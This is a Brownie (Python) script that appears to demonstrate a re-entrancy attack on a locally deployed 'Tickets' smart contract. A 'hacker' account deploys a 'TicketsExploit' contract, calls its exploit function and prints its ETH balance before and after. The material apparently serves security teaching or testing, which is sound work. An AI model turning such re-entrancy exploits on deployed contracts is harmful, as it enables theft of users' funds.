from brownie import *

deployer = accounts[0]
user1 = accounts[1]
user2 = accounts[2]
hacker = accounts[3]

HOUR = 3600
DAY = 24 * HOUR 
WEEK = 7 * DAY 

# Deploy contract with deployer
contract_tickets = deployer.deploy(Tickets)

###### Initialize contract with deployer ######
event = "Hacker Conference"
price = Wei("1 ether")
tickets = 100
duration = WEEK
contract_tickets.initialize(event, price, tickets, duration, {'from': deployer})


###### Buy 5 tickets with user1 ######
number_of_ticets = 5
tickets_price = number_of_ticets * price
tx1 = contract_tickets.buy(number_of_ticets, {'from': user1, 'value' : tickets_price})



########### EXPLOIT ###########

# The hacker deploys the exploit contract
contract_exploit = hacker.deploy(TicketsExploit,contract_tickets)

# The balance of the hacker before the exploit
hacker_balance = hacker.balance() / 10**18
print("hacker ETH balance: {}".format(hacker_balance))

# Exploiting the contract with re-entrancy attack
tx = contract_exploit.exploit({'from': hacker, 'value': Wei("1 ether")})

# The balance of the hacker after the exploit
hacker_balance = hacker.balance() / 10**18
print("hacker ETH balance: {}".format(hacker_balance))